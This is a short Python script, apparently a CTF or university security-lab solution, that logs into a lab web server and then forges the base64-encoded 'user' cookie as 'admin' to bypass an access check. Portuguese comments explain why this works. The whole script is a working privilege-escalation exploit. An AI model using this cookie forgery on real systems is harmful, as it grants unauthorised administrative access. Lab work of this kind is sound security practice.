import requests
import base64

SERVER = "http://mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 25056 
link = f"{SERVER}:{PORT}"

s = requests.Session()

r = s.get(link)
print(r.text)

r = s.post(link, data={
    "username": "João Pereira"
})

print(r.text + "\n")
print(s.cookies)
print("\n")
# Como o site diz que non-admin users não têm acesso, então mudar para um username de admin pode dar acesso
# Não funciona começar logo como username admin, pois o site verifica que o username é inicialmente admin e atribui um "fake-admin", logo temos de trocar o valor na cookie.
# O valor de user na cookie está em B64, então se mudarmos isso para admin em B64, vamos passar a ser o user admin, tendo acesso
admin_name = base64.b64encode(b"admin").decode()
s.cookies.set("user", admin_name, domain="mustard.stt.rnl.tecnico.ulisboa.pt")

res = s.get(link)
print(res.text)